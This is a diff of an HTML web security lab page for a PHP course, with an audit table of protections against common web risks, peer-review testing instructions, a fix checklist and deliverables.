+          The audit of Syaha, summarised. Fill the same table for your project, with the file where each protection is, or &quot;missing&quot;:<table><tr><th>Risk</th><th>Protection in Syaha</th><th>Since</th></tr><tr><td>SQL injection</td><td>prepared statements everywhere, <code>ORDER BY</code> from a fixed list</td><td>Lab 5</td></tr><tr><td>XSS</td><td><code>e()</code> on every output, <code>textContent</code> in JavaScript, CSP</td><td>Labs 5, 9</td></tr><tr><td>CSRF</td><td>token in every POST form, checked for every POST request; <code>SameSite</code> cookie</td><td>Labs 7, 9</td></tr><tr><td>Invalid data</td><td>server validation of every field and every choice</td><td>Lab 6</td></tr><tr><td>Passwords</td><td><code>password_hash()</code>, never displayed or sent back</td><td>Lab 7</td></tr><tr><td>Brute force</td><td>failures counted per e-mail and per IP in the database</td><td>Lab 9</td></tr><tr><td>Session theft / fixation</td><td><code>HttpOnly</code>, strict mode, new id at login, timeout</td><td>Lab 7</td></tr><tr><td>Missing authorization</td><td><code>guard.php</code> for the admin area, owner checked in the queries</td><td>Labs 7, 9</td></tr><tr><td>Malicious upload</td><td>size, real type, random name, no script in <code>uploads/</code></td><td>Lab 6</td></tr><tr><td>Information leaks</td><td>errors logged, not shown; no <code>X-Powered-By</code>; no folder listing</td><td>Lab 9</td></tr><tr><td>Clickjacking, sniffing</td><td>security headers</td><td>Lab 9</td></tr><tr><td>Secrets in Git</td><td><code>config.local.php</code> ignored by Git</td><td>Lab 9</td></tr></table>
+        </div>
+      </div>
+      <h3 class="Sub_Section_Title">Peer review</h3>
       <div class="Definitions">
         <p>
-          A fresh pair of eyes always finds problems the authors missed. Your teacher will pair the teams. Then:
+          Exchange your project with another team for one hour. Install it from its README, then try every attack of this lab on it: change ids, remove <code>required</code>, type HTML in every field, post a form from another page, log in 10 times with a wrong password, open an admin page as a customer, upload a renamed <code>.php</code> file. Write each finding as a GitHub issue of their repository, with the steps to reproduce it; never fix their code yourself.
         </p>
-        <ol>
-          <li>Each team gives the other team read access to its repository (or the URL if it is public) and the
-            <code>.sql</code> dump of its database.</li>
-          <li>Clone the other project, install it on your own XAMPP and make it work (this is also a test of their
-            README and setup instructions).</li>
-          <li>For about 45 minutes, go through the checklist above on their services. Use only your local copy.</li>
-          <li>For each problem found, open an issue on their repository with the label <code>security</code>: the
-            service, the steps to reproduce, the impact, and a suggested fix. Be precise and constructive; do not
-            publish working exploits outside the issue.</li>
-          <li>Each team then fixes the issues it received and closes them with a commit message such as
-            <code>Fix IDOR in edit_post.php (closes #12)</code>.</li>
-        </ol>
       </div>
-      <div class="Note"><strong>Tip:</strong> classify each finding by severity to decide what to fix first:
-        <strong>High</strong> (SQL injection, missing authorization, executable uploads, leaked passwords),
-        <strong>Medium</strong> (XSS, CSRF, session issues), <strong>Low</strong> (missing headers, verbose
-        errors).</div>
+    </section>
+    <section id="Your_Turn">
+      <h2 class="Section_Title">X. Your turn</h2>
+      <div class="Definitions">
+        <div>
+          <ol><li>List the entry points of your project (Section I).</li><li>Search and fix every query built with a variable, every output without <code>e()</code>, every <code>innerHTML</code> with data.</li><li>Add CSRF tokens to every POST form, checked in one place.</li><li>Check the owner in every query that reads or changes an object of a user.</li><li>Count the wrong passwords in the database.</li><li>Hide the errors (<code>APP_DEBUG</code>), send the security headers, and move the inline scripts to files.</li><li>Move the secrets to an ignored file, and close <code>includes/</code> and your SQL folder.</li><li>Fill the audit table and do the peer review.</li></ol>
+        </div>
+      </div>
     </section>
     <section id="Deliverables">
       <h2 class="Section_Title">Deliverables</h2>
       <ul class="Checklist">
-        <li>A <code>SECURITY_AUDIT.md</code> file at the root of the repository with the inventory of your services
-          and one completed checklist table per service.</li>
-        <li>All the fixes committed on the <code>security-audit</code> branch and merged into <code>main</code>
-          through a pull request; each fix linked to its issue.</li>
-        <li>The issues opened on the other team's repository during the peer review, and the issues you received
-          fixed or answered.</li>
-        <li><code>config.php</code> ignored by Git and <code>config.example.php</code> committed.</li>
-        <li>This work counts toward the "PHP/AJAX: Finish the backend" milestone in the Deadlines table of the
-          <a href="Syllabus.html">Syllabus</a>.</li>
+        <li>The audit table of your project, every line fixed or explained.</li>
+        <li>CSRF tokens on every POST form; authorization checked for every object; brute force limited.</li>
+        <li>No error displayed to visitors, security headers sent, no inline script.</li>
+        <li>No secret in the Git repository (check the history too).</li>
+        <li>The issues opened by the peer review, fixed and closed.</li>
+        <li>This lab counts toward the "PHP/AJAX" milestone of the <a href="Syllabus.html#Deadlines">Deadlines</a> table.</li>
       </ul>
     </section>
   </main>
   <footer class="Inter_Pages">
-    <a href="Lab_9.html" class="Arrow">
+    <a href="Lab_8.html" class="Arrow">
       <i class="fa-solid fa-angles-left fa-beat fa-2xl"></i>
-      <h1>Lab 9: AJAX and JSON</h1>
+      <h1>Lab 8: AJAX and JSON</h1>
     </a>
-    <a href="Lab_11.html" class="Arrow">
-      <h1>Lab 11: Final project</h1><i class="fa-solid fa-angles-right fa-beat fa-2xl"></i>
+    <a href="Lab_10.html" class="Arrow">
+      <h1>Lab 10: Final project</h1><i class="fa-solid fa-angles-right fa-beat fa-2xl"></i>
     </a>
   </footer>
   <script src="SRC/JS/Script.js" type="module"></script>
